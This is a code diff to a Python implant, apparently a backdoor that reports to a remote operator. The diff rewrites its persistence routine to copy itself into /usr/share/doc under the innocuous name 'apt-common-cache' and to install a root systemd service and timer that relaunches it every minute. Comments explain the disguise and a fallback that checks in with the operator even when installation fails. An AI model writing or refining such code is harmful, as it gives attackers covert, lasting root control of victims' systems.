@@ -1,6 +1,7 @@
 import requests
 import subprocess
-import time
+import shutil
+import sys
 import os
 from pathlib import Path
 from Cryptodome.Cipher import AES
@@ -28,52 +29,64 @@ def decrypt_msg(encoded_ciphertext):
     return unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')
 
 def install_persistence():
-    # 1. Define the paths
-    home = str(Path.home())
-    systemd_dir = os.path.join(home, ".config/systemd/user")
-    service_path = os.path.join(systemd_dir, "agent.service")
-    timer_path = os.path.join(systemd_dir, "agent.timer")
+    # 1. Configuration - Choosing a "Boring" Name
+    APP_NAME = "apt-common-cache"
+    # Stash path: hiding among documentation
+    STASH_DIR = "/usr/share/doc/apt-common"
+    STASH_PATH = os.path.join(STASH_DIR, APP_NAME)
     
-    # Ensure the directory exists
-    os.makedirs(systemd_dir, exist_ok=True)
+    SYSTEMD_DIR = "/etc/systemd/system"
+    SERVICE_PATH = os.path.join(SYSTEMD_DIR, f"{APP_NAME}.service")
+    TIMER_PATH = os.path.join(SYSTEMD_DIR, f"{APP_NAME}.timer")
 
-    # 2. Define the file contents
-    # script_path is the absolute path to this script
-    script_path = os.path.abspath(__file__)
+    # 2. Self-Migration
+    # If we aren't running from the stash path, copy ourselves there
+    current_exe = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
     
+    try:
+        if not os.path.exists(STASH_DIR):
+            os.makedirs(STASH_DIR, exist_ok=True)
+        
+        if current_exe != STASH_PATH:
+            shutil.copy2(current_exe, STASH_PATH)
+            os.chmod(STASH_PATH, 0o755)
+    except PermissionError:
+        return
+
+    # 3. System-Wide Service Content (Runs as Root)
     service_content = f"""[Unit]
-Description=System Telemetry Service
+Description=APT Common Cache Manager
+After=network.target
+
 [Service]
-ExecStart=/usr/bin/python3 {script_path}
+ExecStart={STASH_PATH}
 Type=oneshot
+User=root
 """
 
-    timer_content = """[Unit]
-Description=Run System Telemetry every minute
+    timer_content = f"""[Unit]
+Description=Trigger APT Common Cache every minute
+
 [Timer]
-OnActiveSec=1min
+OnBootSec=1min
 OnUnitActiveSec=1min
-RandomizedDelaySec=10
+RandomizedDelaySec=5
+
 [Install]
 WantedBy=timers.target
 """
 
-
-    # 3. Write the files if they don't exist
-    if not os.path.exists(service_path):
-        with open(service_path, "w") as f:
-            f.write(service_content)
+    # 4. Write the system files
+    with open(SERVICE_PATH, "w") as f:
+        f.write(service_content)
             
-    if not os.path.exists(timer_path):
-        with open(timer_path, "w") as f:
-            f.write(timer_content)
+    with open(TIMER_PATH, "w") as f:
+        f.write(timer_content)
 
-    # 4. Tell systemd to load them and start
-    subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
-    subprocess.run(["systemctl", "--user", "enable", "agent.timer"], check=True)
-    subprocess.run(["systemctl", "--user", "start", "agent.timer"], check=True)
-    
-    print("[+] Persistence installed successfully.")
+    # 5. Load and Start (System-level, no --user flag)
+    subprocess.run(["systemctl", "daemon-reload"], check=True)
+    subprocess.run(["systemctl", "enable", f"{APP_NAME}.timer"], check=True)
+    subprocess.run(["systemctl", "start", f"{APP_NAME}.timer"], check=True)
 
 def check_in():
     try:
@@ -107,6 +120,28 @@ def check_in():
         pass
 
 if __name__ == "__main__":
-    if not os.path.exists(os.path.expanduser("~/.config/systemd/user/agent.timer")):
-        install_persistence()
+    # 1. Define the "Official" location we decided on
+    APP_NAME = "apt-common-cache"
+    STASH_PATH = f"/usr/share/doc/apt-common/{APP_NAME}"
+    SYSTEM_SERVICE_CHECK = f"/etc/systemd/system/{APP_NAME}.timer"
+
+    # 2. Check if we are already installed and running from the right place
+    # We check for the timer file because that is the heart of the persistence
+    is_installed = os.path.exists(SYSTEM_SERVICE_CHECK)
+    
+    # Check if the current running executable is the one in /usr/share/doc
+    # (sys.executable handles the Nuitka binary path)
+    current_exe = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
+    is_running_from_stash = (current_exe == STASH_PATH)
+
+    # 3. Decision Logic
+    if not is_installed or not is_running_from_stash:
+        # If we aren't installed OR we are running from a temporary 
+        # location (like /tmp after a curl download), run the installer.
+        try:
+            install_persistence()
+        except Exception as e:
+            # If we fail (e.g., no sudo), we still want to check_in once 
+            # so the operator knows we arrived, even if we can't stay.
+            pass
     check_in()
